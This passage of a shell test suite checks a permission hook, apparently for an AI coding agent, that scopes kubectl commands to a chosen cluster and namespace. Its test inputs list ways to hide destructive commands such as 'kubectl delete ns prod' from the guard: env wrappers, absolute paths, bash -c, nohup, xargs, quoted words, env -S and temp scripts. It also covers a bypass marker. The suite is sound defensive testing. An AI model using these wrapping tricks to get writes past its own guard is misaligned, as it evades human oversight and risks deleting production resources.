    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: env-wrapped kubectl run force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'env KUBECONFIG=/tmp/test kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: absolute kubectl path force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session '/usr/bin/kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: command wrapper around kubectl run force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session 'command /usr/bin/kubectl run script-test --image=pause -n gdd-practice' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: bash -c containing kubectl force-asks" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    run_hook_with_session "bash -c 'kubectl run script-test --image=pause -n gdd-practice'" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
}
@test "k8s safety floor: matching bypass permits an unscoped write" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    write_bypass_marker "k8s" "no-scope-sess" "disposable cluster automation"
    run_hook_with_session 'kubectl apply -k overlays/plain' "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}
@test "k8s safety floor: matching bypass permits an unscoped kubectl script" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    printf '#!/bin/bash\nkubectl apply -k overlays/plain\n' > "$WORK/danger.sh"
    write_bypass_marker "k8s" "no-scope-sess" "disposable cluster automation"
    run_hook_with_session "bash $WORK/danger.sh" "no-scope-sess"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}
@test "scoped-redirect: raw in-scope kubectl READ auto-approves (agent path)" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl get pods -n kube-system' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: normalized kubectl aliases cannot inherit the raw-read auto-allow" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"

    local command
    for command in \
        '/usr/bin/kubectl get pods -n kube-system' \
        'components/evil/kubectl get pods -n kube-system' \
        'KUBECONFIG=.tmp/config kubectl get pods -n kube-system'; do
        run_hook_with_session "$command" "sk8s"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    done
}
@test "scoped-redirect: raw in-scope kubectl WRITE still redirects to ws k8s (context injection)" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n alice-sandbox' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws k8s"* ]]
}
@test "scoped-redirect: raw out-of-scope kubectl write denies with the guard message" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"REJECTED by the k8s scope guard"* ]]
}

@test "scoped-redirect: transparent wrappers preserve an out-of-scope write denial" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'nohup timeout 10s kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"REJECTED by the k8s scope guard"* ]]
}

@test "scoped-redirect: quoted wrapper command words cannot evade Kubernetes inspection" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    printf '#!/usr/bin/env bash\nkubectl delete pod foo -n prod\n' > "$WORK/danger.sh"
    local command
    for command in \
        'nohup "xargs" "kubectl" delete pod foo -n prod' \
        "nohup \"bash\" $WORK/danger.sh" \
        'nohup "kubectl" delete pod foo -n prod; true'; do
        run_hook_with_session "$command" "sk8s"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    done
}

@test "scoped-redirect: env launch and split-string options cannot bypass Kubernetes inspection" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    local command
    for command in \
        'env -C /tmp kubectl delete pod foo -n prod' \
        'env -a kubectl-probe kubectl delete pod foo -n prod' \
        'env -S "kubectl delete pod foo -n prod"' \
        'env --split-string="kubectl delete pod foo -n prod"'; do
        run_hook_with_session "$command" "sk8s"
        [ "$status" -eq 0 ]
        [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    done
}

@test "scoped-redirect: xargs Kubernetes construction is denied as unclassifiable" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'xargs kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"composition-free command"* ]]
}

@test "scoped-redirect: quoted xargs and kubectl command words remain denied" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session '"xargs" "kubectl" delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"composition-free command"* ]]
}

@test "scoped-redirect: quoted kubectl data after xargs keeps normal routing" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'xargs echo "kubectl"' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"composition-free command"* ]]
}

@test "scoped-redirect: transparent wrapper chains preserve quoted xargs command words" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'nohup timeout 10s xargs "kubectl" delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"composition-free command"* ]]
}

@test "scoped-redirect: transparent wrapper chains keep quoted xargs data inert" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'nohup timeout 10s xargs echo "kubectl"' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"composition-free command"* ]]
}

@test "scoped-redirect: unrelated transparent wrapper keeps normal routing" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'nohup sleep 1' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"REJECTED by the k8s scope guard"* ]]
}

@test "scoped-redirect: in-scope ws k8s read auto-approves" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s get pods -n kube-system' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: in-scope ws k8s server dry-run auto-approves" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    printf 'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: x\n  namespace: alice-sandbox\n' > "$WORK/m.yaml"
    run_hook_with_session "ws k8s apply -f $WORK/m.yaml --dry-run=server" "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: in-scope RAW kubectl dry-run is redirected, not auto-approved" {
    # Only `ws k8s` injects the armed --context. A raw dry-run would run against
    # whatever kubeconfig currently points at, so it reports on a cluster the
    # operator did not choose — and a dry-run is consulted precisely because its
    # answer is trusted. Same reasoning that already keeps in-scope raw WRITES on
    # the redirect path; the dry-run verdict must not become a hole in it.
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    printf 'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: x\n  namespace: alice-sandbox\n' > "$WORK/m.yaml"
    run_hook_with_session "kubectl apply -f $WORK/m.yaml --dry-run=server" "sk8s"
    [ "$status" -eq 0 ]
    # Assert the redirect itself, not merely the absence of allow — a fallthrough
    # emitting no decision would satisfy a negative check while leaving the raw
    # command to run unpinned, which is the exact failure being guarded.
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws k8s"* ]]
}
@test "scoped-redirect: normalized ws k8s aliases cannot inherit the read auto-allow" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'env KUBECONFIG=/tmp/test ws k8s get pods -n kube-system' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
}
@test "scoped-redirect: out-of-scope ws k8s write denies" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: cluster-scoped ws k8s write deny renders class-appropriate remediation" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s delete namespace prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"REJECTED by the k8s scope guard"* ]]
    # The raw verdict class tag must not leak into the user-facing message.
    [[ "$output" != *"unbounded:"* ]]
}
@test "scoped-redirect: temp script containing kubectl is denied under scope" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    printf '#!/bin/bash\nkubectl delete ns prod\n' > "$WORK/danger.sh"
    run_hook_with_session "bash $WORK/danger.sh" "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: relative executable kubectl-run script resolves from payload cwd" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "gdd-practice"
    printf '#!/bin/bash\nkubectl run script-test --image=pause --restart=Never -n gdd-practice\n' > "$WORK/chapter4-script-test.sh"
    chmod +x "$WORK/chapter4-script-test.sh"
    run_hook_with_session './chapter4-script-test.sh' "sk8s" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: bash options do not hide kubectl-run script path" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "gdd-practice"
    printf '#!/bin/bash\nkubectl run script-test --image=pause --restart=Never -n gdd-practice\n' > "$WORK/chapter4-script-test.sh"
    run_hook_with_session 'bash -x ./chapter4-script-test.sh' "sk8s" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: matching bypass marker lifts the redirect and audits BYPASS-SCOPE" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    write_bypass_marker "k8s" "sk8s" "practicing"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}

# ─── Tier 2b: ws k8s scope management NOT denied when scope armed ────
#
# Fix 1 regression guards: once a scope is armed, the hook's Tier 2b arm
# must NOT deny the wrapper's own management subcommands (scope show/clear/set).
# Before the fix, the guard treated `scope` as an unknown write verb, resolved
# it against the practice namespace, and returned BLOCK — causing the hook to
# deny scope management calls after the scope was first armed.

@test "scoped-redirect: ws k8s scope show is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope show' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: ws k8s scope clear is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope clear' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: ws k8s scope set is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope set --context kind-practice --namespace alice-sandbox' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}
